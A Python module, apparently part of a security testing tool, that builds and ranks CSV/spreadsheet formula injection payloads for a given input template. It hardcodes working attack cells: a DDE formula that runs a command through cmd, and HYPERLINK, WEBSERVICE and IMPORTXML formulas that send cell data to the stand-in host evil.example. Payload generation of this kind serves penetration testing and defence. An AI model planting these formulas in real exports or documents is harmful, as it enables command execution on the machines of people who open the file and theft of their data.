"""CSV / spreadsheet formula injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_csv_context

_CELL_BODIES = [
    ("=cmd|'/C calc'!A1", "dde-command"),
    ('=HYPERLINK("https://evil.example?d="&A1,"click")', "hyperlink-exfil"),
    ('=WEBSERVICE("https://evil.example?d="&A1)', "webservice-exfil"),
    ('=IMPORTXML("https://evil.example","//a")', "importxml-exfil"),
    ("@SUM(1+1)*cmd|'/C calc'!A1", "at-command"),
    ("=1+1", "formula-probe"),
]

_MIDCELL_BODIES = [
    (",=cmd|'/C calc'!A1", "new-cell-dde"),
    (',=HYPERLINK("https://evil.example","x")', "new-cell-hyperlink"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class CsvCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class CsvMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[CsvCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def mutate_csv(template: str) -> CsvMutationResult:
    """Generate and rank CSV formula injection payloads for ``template``."""
    from .analyzer import analyze_csv

    context = analyze_csv_context(template)
    generated = _CELL_BODIES if context == Context.CSV_CELL else _MIDCELL_BODIES

    candidates: list[CsvCandidate] = []
    for payload, strategy in generated:
        result = analyze_csv(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                CsvCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return CsvMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
